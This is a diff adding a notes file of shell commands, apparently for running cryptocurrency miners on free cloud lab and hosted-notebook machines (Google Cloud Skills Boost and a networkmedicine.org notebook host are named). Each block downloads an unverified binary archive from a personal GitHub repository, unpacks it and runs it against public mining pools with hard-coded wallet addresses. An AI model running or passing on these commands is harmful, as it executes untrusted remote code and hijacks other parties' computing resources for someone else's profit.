@@ -1,0 +1,50 @@
+https://www.cloudskillsboost.google
+
+
+sudo apt install screen &&
+screen -R dewa 
+sudo apt-get install wget &&
+wget https://github.com/bamlone/seram/raw/main/seram83.tar.xz && tar -xf seram83.tar.xz  && cd seram83 &&
+./seram83  --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.asia.mine.zergpool.com:6247   --wallet rFvnmovfgHkgR1WDnxMMWrtGtrwMyGLxzf  -p c=RVN  --cpu-threads 2 --cpu-threads-priority 3  --cpu-threads-intensity 1
+
+
+sudo apt install screen &&
+screen -R dewa 
+sudo apt-get install wget &&
+wget https://github.com/bamlone/seram/raw/main/seram85.tar.xz && tar -xf seram85.tar.xz  && cd seram85 &&
+./seram85  --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.asia.mine.zergpool.com:6247   --wallet rFvnmovfgHkgR1WDnxMMWrtGtrwMyGLxzf  -p c=RVN  --cpu-threads 2 --cpu-threads-priority 3  --cpu-threads-intensity 1
+
+
+sudo apt install screen &&
+screen -R dewa 
+sudo apt-get install wget &&
+wget https://github.com/bamlone/seram/raw/main/seram87.tar.xz && tar -xf seram87.tar.xz  && cd seram87 &&
+./seram87  --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.asia.mine.zergpool.com:6247   --wallet rFvnmovfgHkgR1WDnxMMWrtGtrwMyGLxzf  -p c=RVN  --cpu-threads 2 --cpu-threads-priority 3  --cpu-threads-intensity 1
+
+
+
+netbooks.networkmedicine.org
+
+
+sudo apt-get install wget &&
+wget https://github.com/bamlone/culan/raw/main/culan20.tar.xz && tar -xf culan20.tar.xz && cd culan20 &&
+./culan20sse2 -a yespowermgpc  -o stratum+tcp://stratum-asia.rplant.xyz:7049 -u MpS2yJaP91oHQtBDnxQyZxDPxFXGTqLQxT -t 6
+
+
+sudo apt-get install wget &&
+wget https://github.com/bamlone/culan/raw/main/culan22.tar.xz && tar -xf culan22.tar.xz && cd culan22 &&
+./culan22sse2 -a yespowermgpc  -o stratum+tcp://au.mining4people.com:3352 -u MpS2yJaP91oHQtBDnxQyZxDPxFXGTqLQxT -t 6
+
+
+sudo apt-get install wget &&
+wget https://github.com/bamlone/culan/raw/main/culan24.tar.xz && tar -xf culan24.tar.xz && cd culan24 &&
+./culan24sse2 -a yespowermgpc  -o stratum+tcp://yespowerMGPC.asia.mine.zergpool.com:6247 -u rFvnmovfgHkgR1WDnxMMWrtGtrwMyGLxzf -p c=RVN -t 5
+
+
+
+
+
+https://raw.githubusercontent.com/bamlone/tex/main/mpgc-allin.txt
+
+https://github.com/bamlone/tex/blob/main/mpgc-allin.txt
+
